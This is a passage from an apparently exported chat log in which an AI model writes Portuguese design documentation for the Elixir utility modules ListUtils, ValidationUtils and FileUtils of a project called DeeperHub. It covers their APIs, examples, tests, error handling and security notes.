    *   `ListUtils.chunk(all_items, 10)` para processar ou exibir itens em páginas de 10.
*   **Encontrar Novos Usuários em uma Lista:**
    *   `ListUtils.diff(current_users, previous_users, &(&1.id))` para identificar usuários recém-adicionados.
*   **Organizar Tarefas por Prioridade:**
    *   `ListUtils.group_by(tasks, &(&1.priority))` para obter um mapa de prioridade para listas de tarefas.
*   **Renderizar uma Tabela Paginada:**
    *   `ListUtils.paginate(all_table_rows, current_page, 20)`.
*   **Ordenar uma Lista de Produtos por Preço e Depois por Nome:**
    *   `ListUtils.sort_by_keys(products, [{:price, :asc}, {:name, :asc}])`.
*   **Obter uma Lista de Tags Únicas de Múltiplas Fontes:**
    *   `ListUtils.unique(list_of_all_tags_from_servers, &(&1.name |> String.downcase()))`.

## 🌊 5. Fluxos Importantes

Não aplicável no mesmo sentido que módulos com estado. O fluxo é a execução da função com a lista de entrada e o retorno da lista transformada ou do resultado calculado.

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original, com algumas clarificações)*

### 6.1. `DeeperHub.Shared.Utils.ListUtils.chunk(list :: list(), chunk_size :: pos_integer()) :: list(list())`

*   **Descrição:** Divide `list` em sub-listas, cada uma com no máximo `chunk_size` elementos.
*   **Exemplo:** `ListUtils.chunk([1,2,3,4,5], 2)` -> `[[1,2], [3,4], [5]]`

### 6.2. `DeeperHub.Shared.Utils.ListUtils.partition(list :: list(), predicate_fun :: (element :: term() -> boolean())) :: {list(), list()}`

*   **Descrição:** Divide `list` em duas listas: a primeira com elementos para os quais `predicate_fun` retorna `true`, e a segunda com os restantes.
*   **Exemplo:** `ListUtils.partition([1,2,3,4], &Integer.is_even/1)` -> `{[2,4], [1,3]}`

### 6.3. `DeeperHub.Shared.Utils.ListUtils.diff(list1 :: list(), list2 :: list(), key_fun :: (element :: term() -> term()) | nil \\\\ nil) :: list()`

*   **Descrição:** Retorna os elementos que estão em `list1` mas não em `list2`. Se `key_fun` for fornecida, a comparação é baseada no resultado da aplicação de `key_fun` a cada elemento.
*   **Exemplo:** `ListUtils.diff([%{id: 1}, %{id: 2}], [%{id: 2}, %{id: 3}], &(&1.id))` -> `[%{id: 1}]`

### 6.4. `DeeperHub.Shared.Utils.ListUtils.group_by(list :: list(), key_fun :: (element :: term() -> group_key :: term())) :: map()`

*   **Descrição:** Agrupa elementos de `list` em um mapa, onde as chaves são o resultado de `key_fun` e os valores são listas dos elementos correspondentes.
*   **Exemplo:** `ListUtils.group_by([%{type: \"A\"}, %{type: \"B\"}, %{type: \"A\"}], &(&1.type))` -> `%{ \"A\" => [%{type: \"A\"}, %{type: \"A\"}], \"B\" => [%{type: \"B\"}]}`

### 6.5. `DeeperHub.Shared.Utils.ListUtils.interleave(list1 :: list(), list2 :: list()) :: list()`

*   **Descrição:** Cria uma nova lista intercalando os elementos de `list1` e `list2`. Se uma lista for mais longa, seus elementos restantes são anexados no final.
*   **Exemplo:** `ListUtils.interleave([1,3], [2,4,5])` -> `[1,2,3,4,5]`

### 6.6. `DeeperHub.Shared.Utils.ListUtils.paginate(list :: list(), page_number :: pos_integer(), per_page :: pos_integer()) :: %{items: list(), page: pos_integer(), per_page: pos_integer(), total_items: non_neg_integer(), total_pages: non_neg_integer()}`

*   **Descrição:** Retorna uma \"página\" de itens da `list` e metadados de paginação.
*   **Exemplo:** `ListUtils.paginate(Enum.to_list(1..10), 2, 3)` -> `%{items: [4,5,6], page: 2, per_page: 3, total_items: 10, total_pages: 4}`

### 6.7. `DeeperHub.Shared.Utils.ListUtils.sort_by_keys(list_of_maps_or_structs :: list(), sort_definitions :: list({key_path :: atom() | list(), direction :: :asc | :desc})) :: list()`

*   **Descrição:** Ordena uma lista de mapas/structs. `sort_definitions` é uma lista de tuplas onde `key_path` pode ser um átomo para acesso direto ou uma lista para acesso aninhado (ex: `[:user, :name]`).
*   **Exemplo:** `ListUtils.sort_by_keys([%{a:2,b:1}, %{a:1,b:2}], [{:a, :asc}])` -> `[%{a:1,b:2}, %{a:2,b:1}]`

### 6.8. `DeeperHub.Shared.Utils.ListUtils.unique(list :: list(), key_fun :: (element :: term() -> unique_key :: term()) | nil \\\\ nil) :: list()`

*   **Descrição:** Remove elementos duplicados da `list`. Se `key_fun` for fornecida, a unicidade é baseada no resultado de `key_fun`. A ordem dos elementos restantes é preservada com base na primeira ocorrência.
*   **Exemplo:** `ListUtils.unique([%{id:1, v:1}, %{id:2,v:2}, %{id:1,v:3}], &(&1.id))` -> `[%{id:1, v:1}, %{id:2,v:2}]`

### 6.9. `DeeperHub.Shared.Utils.ListUtils.safe_nth(list :: list(), index :: integer(), default_value :: term() \\\\ nil) :: term()` (Nova Sugestão)

*   **Descrição:** Retorna o elemento no `index` (base 0) da lista, ou `default_value` se o índice estiver fora dos limites.
*   **Exemplo:** `ListUtils.safe_nth([10,20,30], 1)` -> `20`, `ListUtils.safe_nth([10], 5, :not_found)` -> `:not_found`

### 6.10. `DeeperHub.Shared.Utils.ListUtils.transpose(list_of_lists :: list(list())) :: list(list()) | {:error, :uneven_lists}` (Nova Sugestão)

*   **Descrição:** Transpõe as linhas e colunas de uma lista de listas. Retorna erro se as listas internas tiverem tamanhos diferentes.
*   **Exemplo:** `ListUtils.transpose([[1,2,3],[4,5,6]])` -> `[[1,4],[2,5],[3,6]]`

## ⚙️ 7. Configuração

Este módulo, sendo puramente funcional e genérico, geralmente não requer configurações externas via `ConfigManager`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   Nenhuma.

### 8.2. Bibliotecas Externas

*   Utiliza primariamente os módulos `Enum` e `List` do Elixir padrão.

## 🤝 9. Como Usar / Integração

Importar ou usar alias e chamar as funções diretamente onde a manipulação de listas for necessária.
```elixir
alias DeeperHub.Shared.Utils.ListUtils

def process_batched_users(all_users) do
  Enum.each(ListUtils.chunk(all_users, 100), fn user_batch ->
    # Processar o lote de usuários
  end)
end

def find_unique_emails(user_list) do
  ListUtils.unique(user_list, &(&1.email))
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários para cada função com uma variedade de entradas:
    *   Listas vazias.
    *   Listas com um único elemento.
    *   Listas com elementos duplicados (para `unique`, `diff`).
    *   Listas com diferentes tipos de dados.
    *   Casos de borda para `chunk`, `paginate`.
    *   Diferentes `key_fun` para `diff`, `group_by`, `unique`, `sort_by_keys`.
*   Localização: `test/deeper_hub/shared/utils/list_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Não aplicável para um módulo de utilitários puros.

## ❌ 11. Tratamento de Erros

*   Funções devem levantar `ArgumentError` ou `FunctionClauseError` para tipos de entrada inválidos (ex: passar um mapa para uma função que espera uma lista, `chunk_size` não positivo).
*   Funções como `paginate` devem lidar graciosamente com números de página ou `per_page` inválidos (ex: retornar uma lista vazia ou a primeira página).
*   A documentação de cada função deve ser clara sobre seu comportamento em caso de erro.

## 🛡️ 12. Considerações de Segurança

*   Geralmente baixo risco de segurança direto, pois são funções de manipulação de dados.
*   Se as listas contiverem dados sensíveis, as funções não os modificarão ou exporão, apenas os reorganizarão ou filtrarão. A segurança dos dados em si é responsabilidade do chamador.

## 🧑‍💻 13. Contribuição

*   Adicione novas funções apenas se forem utilidades de lista genéricas e amplamente aplicáveis.
*   Priorize a clareza e a consistência com as APIs `Enum` e `List` existentes.
*   Considere a performance de funções que operam em listas potencialmente grandes.
*   Adicione testes unitários completos.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais funções utilitárias (ex: `rotate_list/2`, `weighted_sample/2`, `power_set/1`).
*   [ ] Para algumas funções que podem operar em listas muito grandes (ex: `group_by`, `unique` complexo), considerar oferecer uma variante baseada em `Stream` para processamento lazy.
*   [ ] Melhorar `sort_by_keys` para lidar com `nil` valores de forma configurável (ex: nils primeiro, nils por último).

---

*Última atualização: 2025-05-12*

---

Com isso, cobrimos os utilitários de lista.

Para o próximo, podemos fazer `DeeperHub.Shared.Utils.ValidationUtils` ou `DeeperHub.Shared.Utils.SecurityUtils` para continuar nos utilitários, ou mudar para um módulo de domínio ou Core mais específico?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos continuar com os utilitários e detalhar o `DeeperHub.Shared.Utils.ValidationUtils`. Este módulo é essencial para garantir a integridade dos dados que entram no sistema.

---

# Módulo: `DeeperHub.Shared.Utils.ValidationUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.ValidationUtils`

O módulo `DeeperHub.Shared.Utils.ValidationUtils` fornece um conjunto de **funções utilitárias para validação de formatos de dados comuns e verificação de requisitos básicos**. Ele é usado em várias partes do sistema DeeperHub para garantir que os dados de entrada, antes de serem processados ou persistidos, atendam a certos critérios de formato e presença.

Este módulo foca em validações genéricas e reutilizáveis. Validações mais complexas ou específicas de regras de negócio devem residir nos schemas Ecto dos módulos de domínio ou em serviços de validação dedicados (como `DeeperHub.API.Validation.APIRequestValidator` ou `DeeperHub.Security.Validation.SecurityInputValidation` para contextos específicos). 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Validação de Formatos Comuns:**
    *   Verificar se uma string é um endereço de email válido (formato básico) (`validate_email/1`).
    *   Verificar se uma string é um número de telefone válido (formato básico) (`validate_phone/1`).
    *   Verificar se uma string é uma URL válida (`validate_url/2`).
    *   Verificar se uma string representa uma data/hora válida em um formato específico (`validate_date/3`).
    *   Verificar se uma string representa um número de documento válido (CPF, CNPJ) para um tipo e país (básico) (`validate_document/3`).
    *   Verificar se uma string é um JSON válido (`validate_json/3`).
*   **Validação de Requisitos de Dados:**
    *   Verificar se um valor está presente (não `nil`, não string vazia/em branco) (`validate_required/1`).
    *   Validar a complexidade básica de uma senha (comprimento, presença de tipos de caracteres) (`validate_password/2`). (Nota: Validação de política de senha mais robusta estaria em `DeeperHub.Auth` ou `SecurityPolicyManager`).
    *   Validar o formato e comprimento de um nome de usuário (`validate_username/2`).
*   **Validação de Estrutura de Mapas:**
    *   Verificar se um mapa contém um conjunto específico de chaves obrigatórias (`validate_map/2`).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.ValidationUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade para validação.
    *   Utiliza regex e funções de string/tipo do Elixir para as verificações.
    *   Pode, para validações mais complexas (como documentos específicos de país), delegar para bibliotecas especializadas se necessário, mas o objetivo aqui é manter utilitários leves.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/validation_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Retorno Consistente:** As funções de validação devem ter um padrão de retorno consistente, por exemplo:
    *   Retornar `true`/`false` para verificações simples.
    *   Retornar `{:ok, validated_value}` ou `{:error, reason_atom | {reason_atom, details_map}}` para validações que podem retornar o valor validado ou detalhes do erro. A documentação original usava ambos os estilos. Padronizar em `{:ok, ...} | {:error, ...}` pode ser mais robusto.
*   **Regex Simples vs. Bibliotecas:** Para validações como email e URL, usar regex simples e bem testadas para formatos comuns. Para validações muito complexas ou que exigem conformidade estrita com RFCs, o uso de bibliotecas dedicadas pode ser considerado, mas adiciona dependências.
*   **Não Substitui Validação de Schema Ecto:** Este módulo complementa, mas não substitui, as validações realizadas por Ecto Changesets nos módulos de domínio. Ele é útil para validações rápidas em camadas de serviço ou antes de criar changesets.
*   **Configurabilidade Limitada:** Algumas funções podem aceitar opções (ex: `min_length` para senha), mas configurações globais para esses utilitários são menos comuns e geralmente pertencem a módulos de política.

## 🛠️ 4. Casos de Uso Principais

*   **Validação de Formulário na API antes de criar Changeset:**
    *   Um controller recebe `params = %{\"email\" => \"test\", \"password\" => \"123\"}`.
    *   Antes de passar para `Accounts.create_user(params)`:
        ```elixir
        if !ValidationUtils.validate_email(params[\"email\"]), do: errors = [email: \"Formato inválido\" | errors]
        if !ValidationUtils.validate_password(params[\"password\"], min_length: 8), do: errors = [password: \"Muito curta\" | errors]
        ```
*   **Verificar se um campo obrigatório foi enviado:**
    *   `if !ValidationUtils.validate_required(params[\"user_agent\"]), do: # tratar erro`
*   **Sanitizar e depois validar uma URL de um perfil externo:**
    *   `clean_url = SomeSanitizer.sanitize_url(user_input_url)`
    *   `case ValidationUtils.validate_url(clean_url, allowed_protocols: [\"http\", \"https\"]) do ... end`

## 🌊 5. Fluxos Importantes

Não aplicável no mesmo sentido que módulos com estado. O fluxo é a execução da função com os dados de entrada e o retorno do resultado da validação.

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original, com sugestão de padronizar retornos para `{:ok, ...} | {:error, ...}` onde apropriado para maior clareza do que apenas booleanos)*

### 6.1. `DeeperHub.Shared.Utils.ValidationUtils.validate_email(email :: String.t() | nil) :: {:ok, String.t()} | {:error, :invalid_format | :missing}`

*   **Descrição:** Valida o formato básico de um endereço de email.
*   **Retorno:** `{:ok, email}` se válido, `{:error, :missing}` se `nil` ou vazio, `{:error, :invalid_format}` para outros erros.

### 6.2. `DeeperHub.Shared.Utils.ValidationUtils.validate_phone(phone :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, :invalid_format | :missing}`

*   **Descrição:** Valida o formato básico de um número de telefone.
*   **`opts`:** `:country_code` (atom, ex: `:BR`, `:US` para aplicar regras específicas de comprimento/formato, se implementado), `:min_digits` (integer).
*   **Retorno:** `{:ok, phone}` se válido, `{:error, :missing}` se `nil` ou vazio, `{:error, :invalid_format}` ou `{:error, :too_short}`.

### 6.3. `DeeperHub.Shared.Utils.ValidationUtils.validate_url(url :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, :invalid_format | :missing | :disallowed_protocol}`

*   **Descrição:** Valida o formato de uma URL.
*   **`opts`:**
    *   `:require_protocol` (boolean, Padrão: `true`).
    *   `:allowed_protocols` (list(String.t), Padrão: `[\"http\", \"https\"]`).

### 6.4. `DeeperHub.Shared.Utils.ValidationUtils.validate_date(date_string :: String.t() | nil, format_string :: String.t() \\\\ \"YYYY-MM-DD\", opts :: keyword()) :: {:ok, Date.t() | NaiveDateTime.t()} | {:error, :invalid_format | :missing | :invalid_date}`

*   **Descrição:** Valida se `date_string` corresponde ao `format_string` e representa uma data/hora válida. Tenta converter para `NaiveDateTime` ou `Date`.
*   **`opts`:** `:return_type` (`:naive_datetime`, `:date`, `:datetime_utc` - este último exigiria timezone info ou assumiria UTC).

### 6.5. `DeeperHub.Shared.Utils.ValidationUtils.validate_document(doc_string :: String.t() | nil, type :: atom(), opts :: keyword()) :: {:ok, String.t()} | {:error, :invalid_format | :missing | :invalid_checksum}`

*   **Descrição:** Validação básica para números de documento (ex: CPF, CNPJ). A lógica de checksum seria simplificada ou delegada se complexa.
*   **`type`:** Ex: `:cpf_br`, `:cnpj_br`.
*   **`opts`:** `:validate_checksum` (boolean, Padrão: `true`).

### 6.6. `DeeperHub.Shared.Utils.ValidationUtils.validate_password(password :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, atom()}`

*   **Descrição:** Valida a complexidade básica de uma senha.
*   **`opts`:** `:min_length` (Padrão: 8), `:require_uppercase` (Padrão: `true`), `:require_lowercase` (Padrão: `true`), `:require_digit` (Padrão: `true`), `:require_special` (Padrão: `false`).
*   **Retorno de Erro:** Ex: `:missing`, `:too_short`, `:missing_uppercase`, `:missing_lowercase`, `:missing_digit`, `:missing_special`.

### 6.7. `DeeperHub.Shared.Utils.ValidationUtils.validate_username(username :: String.t() | nil, opts :: keyword()) :: {:ok, String.t()} | {:error, atom()}`

*   **Descrição:** Valida o formato e comprimento de um nome de usuário.
*   **`opts`:** `:min_length` (Padrão: 3), `:max_length` (Padrão: 30), `:allowed_chars_regex` (Padrão: `~r/^[a-zA-Z0-9_]+$/u`).
*   **Retorno de Erro:** Ex: `:missing`, `:too_short`, `:too_long`, `:invalid_chars`.

### 6.8. `DeeperHub.Shared.Utils.ValidationUtils.validate_required(value :: term()) :: boolean()`

*   **Descrição:** Verifica se um valor é considerado \"presente\" (não `nil`, não string vazia, não string só com espaços).
*   **Retorno:** `true` ou `false`.

### 6.9. `DeeperHub.Shared.Utils.ValidationUtils.validate_map_keys(map_data :: map(), required_keys :: list(atom() | String.t()), opts :: keyword()) :: {:ok, map()} | {:error, {:missing_keys, list()} | :not_a_map}` (Renomeado de `validate_map`)

*   **Descrição:** Verifica se `map_data` é um mapa e contém todas as `required_keys`.
*   **`opts`:** `:allow_nil_values_for_required_keys` (boolean, Padrão: `false` - ou seja, a chave deve existir E ter um valor não-nil se esta opção for false).

## ⚙️ 7. Configuração

Geralmente, os padrões para validações (ex: comprimento mínimo de senha, regex de username) podem ser configurados via `Core.ConfigManager` para permitir ajustes sem alterar o código.

*   `[:shared, :utils, :validation, :password, :min_length]`
*   `[:shared, :utils, :validation, :username, :allowed_chars_regex]`
*   ... etc.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager` (para obter padrões configuráveis).

### 8.2. Bibliotecas Externas

*   Pode usar bibliotecas para validações mais complexas se forem adicionadas (ex: `ExCpfCnpj` para documentos brasileiros, `NimbleParsec` para formatos customizados). Para o básico, funções de `String`, `Regex` e `Integer` do Elixir são suficientes.

## 🤝 9. Como Usar / Integração

Em controllers ou serviços, antes de processar dados de entrada ou criar changesets Ecto.

```elixir
defmodule MyApp.RegistrationController do
  alias DeeperHub.Shared.Utils.ValidationUtils

  def create(conn, %{\"user\" => user_params}) do
    with {:ok, email} <- ValidationUtils.validate_email(user_params[\"email\"]),
         {:ok, pass}  <- ValidationUtils.validate_password(user_params[\"password\"], min_length: 10),
         {:ok, uname} <- ValidationUtils.validate_username(user_params[\"username\"]) do
      # Prossiga com a criação do usuário com email, pass, uname
      # ...
    else
      {:error, :missing} -> # Lidar com campo ausente
      {:error, :invalid_format} -> # Lidar com email/username inválido
      {:error, :too_short} -> # Lidar com senha curta
      # ... outros erros ...
    end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários exaustivos para cada função de validação, cobrindo:
    *   Entradas válidas.
    *   Diferentes tipos de entradas inválidas (formato, comprimento, ausência, etc.).
    *   Casos de borda.
    *   Comportamento com `nil` e strings vazias.
    *   Efeito das diferentes opções (`opts`).
*   Localização: `test/deeper_hub/shared/utils/validation_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Geralmente não aplicável para um módulo de utilitários puros. O chamador seria responsável por logar/metricar falhas de validação se relevante para o seu contexto.

## ❌ 11. Tratamento de Erros

*   As funções devem retornar tuplas `{:ok, valid_value}` ou `{:error, reason_atom | {reason_atom, details}}` para permitir que o chamador trate os erros de forma programática.
*   Evitar levantar exceções para entradas inválidas, a menos que seja um erro de programação (ex: tipo de argumento incorreto para a própria função de validação).

## 🛡️ 12. Considerações de Segurança

*   **Não é uma Defesa Completa:** Estas validações de formato são uma primeira linha de defesa, mas não substituem a sanitização de entrada (para XSS, SQLi) ou validações de lógica de negócio mais profundas.
*   **Regexes:** Se usar regexes, garantir que sejam bem testadas e não vulneráveis a ReDoS (Regular Expression Denial of Service).
*   **Falsos Negativos/Positivos:** Estar ciente das limitações das validações baseadas em regex (ex: `validate_email` pode permitir alguns emails tecnicamente inválidos ou rejeitar alguns válidos, mas obscuros).

## 🧑‍💻 13. Contribuição

*   Ao adicionar novas funções de validação, garanta que sejam genéricas e que o comportamento de erro seja consistente com as existentes.
*   Adicione testes unitários completos.
*   Documente claramente os formatos esperados e as opções.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais validadores para tipos comuns (ex: UUID, ISBN, IBAN).
*   [ ] Para validações mais complexas (ex: CPF/CNPJ com lógica de checksum completa), considerar a integração de bibliotecas dedicadas ou a criação de validadores mais robustos.
*   [ ] Permitir que as mensagens de erro retornadas por `{:error, reason}` sejam códigos de i18n para tradução na camada de apresentação.
*   [ ] Criar um validador `validate_number_range(number, min, max, opts)`.

---

*Última atualização: 2025-05-12*

---

Com isso, cobrimos um bom conjunto de utilitários.

Próximo? Podemos detalhar `DeeperHub.Shared.Utils.FileUtils` e `SecurityUtils` para completar os Utils, ou prefere agora ir para um módulo de domínio como `DeeperHub.OAuth` ou `DeeperHub.MFA`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos continuar com os utilitários e detalhar o `DeeperHub.Shared.Utils.FileUtils`. Este módulo é útil se a sua aplicação DeeperHub precisar interagir diretamente com o sistema de arquivos do servidor.

---

# Módulo: `DeeperHub.Shared.Utils.FileUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.FileUtils`

O módulo `DeeperHub.Shared.Utils.FileUtils` fornece um conjunto de **funções utilitárias para interagir com o sistema de arquivos**. Ele encapsula operações comuns de manipulação de arquivos e diretórios, como leitura, escrita, verificação de existência, cópia, cálculo de hash de arquivos e obtenção de informações sobre arquivos.

Este módulo visa simplificar as interações com o sistema de arquivos, fornecer uma API consistente e lidar com erros comuns de forma previsível. Ele é útil para tarefas como gerenciamento de uploads, leitura de arquivos de configuração (que não estão no `ConfigManager`), escrita de logs em arquivos (se não usar um backend de logger mais avançado), ou qualquer outra operação que necessite acesso direto a arquivos. 😊

**Importante:** O acesso direto ao sistema de arquivos deve ser feito com muito cuidado, especialmente se os caminhos dos arquivos forem influenciados por entrada do usuário. A integração com `DeeperHub.Security.PathTraversalProtection` é crucial nesses casos.

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Verificação de Existência:**
    *   Verificar se um arquivo existe em um determinado caminho (`file_exists?/1`).
    *   Verificar se um diretório existe.
*   **Leitura de Arquivos:**
    *   Ler o conteúdo completo de um arquivo de texto (`read_text_file/1`).
    *   Ler o conteúdo de um arquivo binário.
    *   Ler um arquivo linha por linha ou em chunks (para arquivos grandes).
*   **Escrita em Arquivos:**
    *   Escrever (ou sobrescrever) conteúdo em um arquivo de texto (`write_text_file/3`).
    *   Escrever conteúdo binário em um arquivo.
    *   Anexar conteúdo a um arquivo existente.
*   **Manipulação de Arquivos e Diretórios:**
    *   Copiar arquivos (`copy_file/3`).
    *   Mover/Renomear arquivos.
    *   Criar diretórios, incluindo diretórios pai (`ensure_dir_exists/1` - nova sugestão).
    *   Listar o conteúdo de um diretório.
    *   Excluir arquivos e diretórios.
*   **Informações de Arquivo:**
    *   Obter informações sobre um arquivo (tamanho, tipo, permissões, datas de modificação/acesso) (`get_file_info/1`).
    *   Determinar o tipo MIME de um arquivo com base em sua extensão ou conteúdo (magic bytes) (`get_mime_type/1`).
*   **Cálculo de Hash de Arquivo:**
    *   Calcular o hash (MD5, SHA1, SHA256, etc.) do conteúdo de um arquivo (`calculate_file_hash/2`).
*   **Tratamento de Erros:**
    *   Retornar resultados consistentes (ex: `{:ok, ...}` ou `{:error, reason_atom}`) para operações de arquivo.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.FileUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade para arquivos.
    *   Utiliza principalmente os módulos `File`, `Path`, e `:erlang.md5/:crypto` (para hashes) do Elixir/Erlang.
    *   **Importante:** As funções que recebem caminhos como entrada devem ser projetadas para funcionar bem com caminhos normalizados e validados por `DeeperHub.Security.PathTraversalProtection` se a origem do caminho for externa.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/file_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Segurança Primeiro:** Qualquer função que aceite um caminho de arquivo que possa ser influenciado, mesmo que indiretamente, por entrada do usuário, deve ter sua entrada validada e normalizada por `PathTraversalProtection` *antes* de ser passada para `FileUtils`. As funções em `FileUtils` podem assumir que o caminho já é seguro para operações dentro dos diretórios base permitidos.
*   **Tratamento de Erros Explícito:** Operações de arquivo podem falhar por muitos motivos (permissões, arquivo não encontrado, disco cheio, etc.). As funções devem retornar tuplas `{:ok, ...}` ou `{:error, reason}`.
*   **Operações Binárias vs. Texto:** Fornecer funções separadas ou opções claras para lidar com arquivos de texto (com codificação) e arquivos binários.
*   **Streaming para Arquivos Grandes:** Para leitura/escrita de arquivos grandes, usar streams (`File.stream!/3`, `IO.stream/2`) para evitar carregar todo o conteúdo na memória.

## 🛠️ 4. Casos de Uso Principais

*   **Módulo de Upload de Avatares:**
    *   Após receber um upload:
        *   `safe_path = PathTraversalProtection.sanitize_and_verify(user_input_path, @avatar_base_dir)`
        *   `FileUtils.write_binary_file(safe_path, uploaded_binary_data)`
        *   `{:ok, hash} = FileUtils.calculate_file_hash(safe_path, :sha256)` (para verificar integridade ou evitar duplicatas)
*   **Leitura de um Arquivo de Configuração JSON Local (não gerenciado pelo `ConfigManager`):**
    *   `case FileUtils.read_text_file(\"/etc/deeper_hub/custom_plugin_config.json\") do {:ok, content} -> Jason.decode(content) ... end`
*   **Escrita de Logs em Arquivo (Backend de Logger Simples):**
    *   `FileUtils.write_text_file(\"/var/log/deeper_hub/service.log\", formatted_log_entry, append: true, ensure_dir: true)`
*   **Servir um Arquivo Estático Protegido:**
    *   Após verificar permissões:
        *   `safe_path = PathTraversalProtection.verify_path_in_base(user_requested_document, @secure_docs_dir)`
        *   `{:ok, file_info} = FileUtils.get_file_info(safe_path)`
        *   `Plug.Conn.send_file(conn, 200, safe_path, 0, file_info.size)`

## 🌊 5. Fluxos Importantes

### Fluxo de Escrita Segura em Arquivo com Criação de Diretório

1.  **Chamador:** `FileUtils.write_text_file(\"/opt/app/data/reports/2023/report.txt\", \"conteúdo\", ensure_dir: true)`.
    *   **Importante:** O chamador é responsável por garantir que o caminho base (`/opt/app/data/reports/2023/`) é um local seguro e permitido, e que `report.txt` não contém elementos de path traversal se vier de entrada do usuário.
2.  **`FileUtils.write_text_file/3`:**
    *   Se `ensure_dir: true`:
        *   `dir = Path.dirname(\"/opt/app/data/reports/2023/report.txt\")` -> `\"/opt/app/data/reports/2023\"`
        *   Chama `File.mkdir_p(dir)`.
    *   Chama `File.write(\"/opt/app/data/reports/2023/report.txt\", \"conteúdo\", [:write])`.
    *   Retorna o resultado de `File.write`.

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original e expandindo)*

### 6.1. `DeeperHub.Shared.Utils.FileUtils.file_exists?(path :: String.t()) :: boolean()`

*   **Descrição:** Verifica se um arquivo ou diretório existe no `path`. Usa `File.exists?/1`.

### 6.2. `DeeperHub.Shared.Utils.FileUtils.read_text_file(path :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, atom()}`

*   **Descrição:** Lê o conteúdo de um arquivo de texto.
*   **`opts`:** `:encoding` (Padrão: `:utf8`).
*   **Retorno:** `{:ok, content}` ou `{:error, reason}` (ex: `:enoent`, `:eacces`). Usa `File.read/1`.

### 6.3. `DeeperHub.Shared.Utils.FileUtils.read_binary_file(path :: String.t(), opts :: keyword()) :: {:ok, binary()} | {:error, atom()}` (Nova Sugestão)

*   **Descrição:** Lê o conteúdo de um arquivo como binário.
*   **`opts`:** (Nenhuma específica por enquanto).
*   **Retorno:** `{:ok, binary_content}` ou `{:error, reason}`. Usa `File.read/1`.

### 6.4. `DeeperHub.Shared.Utils.FileUtils.write_text_file(path :: String.t(), content :: String.t() | list(String.t()), opts :: keyword()) :: :ok | {:error, atom()}`

*   **Descrição:** Escreve/sobrescreve `content` em `path`.
*   **`opts`:**
    *   `:append` (boolean): Se `true`, anexa ao arquivo. (Padrão: `false`)
    *   `:ensure_dir` (boolean): Se `true`, cria o diretório pai se não existir usando `File.mkdir_p/1`. (Padrão: `false`)
    *   `:encoding` (Padrão: `:utf8`).
*   Usa `File.write/3`.

### 6.5. `DeeperHub.Shared.Utils.FileUtils.write_binary_file(path :: String.t(), binary_content :: binary(), opts :: keyword()) :: :ok | {:error, atom()}` (Nova Sugestão)

*   **Descrição:** Escreve/sobrescreve `binary_content` em `path`.
*   **`opts`:** `:append`, `:ensure_dir`.
*   Usa `File.write/3`.

### 6.6. `DeeperHub.Shared.Utils.FileUtils.copy_file(source_path :: String.t(), dest_path :: String.t(), opts :: keyword()) :: :ok | {:error, atom()}`

*   **Descrição:** Copia um arquivo de `source_path` para `dest_path`.
*   **`opts`:**
    *   `:force` (boolean): Se `true`, sobrescreve `dest_path` se existir. (Padrão: `false`, retorna erro se destino existe).
    *   `:ensure_dest_dir` (boolean): Se `true`, cria o diretório pai de `dest_path`. (Padrão: `false`)
*   Usa `File.copy/3`.

### 6.7. `DeeperHub.Shared.Utils.FileUtils.get_file_info(path :: String.t()) :: {:ok, File.Stat.t()} | {:error, atom()}`

*   **Descrição:** Retorna informações sobre o arquivo (tamanho, tipo, datas). Usa `File.stat/1`.

### 6.8. `DeeperHub.Shared.Utils.FileUtils.get_mime_type(path :: String.t()) :: {:ok, String.t()} | {:error, :extension_not_found}`

*   **Descrição:** Tenta inferir o tipo MIME com base na extensão do arquivo. Pode usar um mapa interno de extensões para tipos MIME ou uma biblioteca.
*   **Retorno:** Ex: `{:ok, \"image/png\"}`, `{:ok, \"application/octet-stream\"}` (como fallback), ou `{:error, :extension_not_found}`.

### 6.9. `DeeperHub.Shared.Utils.FileUtils.calculate_file_hash(path :: String.t(), algorithm :: :md5 | :sha1 | :sha256 | :sha512) :: {:ok, String.t()} | {:error, atom()}`

*   **Descrição:** Calcula o hash do conteúdo do arquivo usando o `algorithm` especificado. Retorna o hash como uma string hexadecimal.
*   Usa `:crypto.hash/2` ou `:erlang.md5/1`.

### 6.10. `DeeperHub.Shared.Utils.FileUtils.ensure_dir_exists(dir_path :: String.t()) :: :ok | {:error, atom()}` (Nova Sugestão)

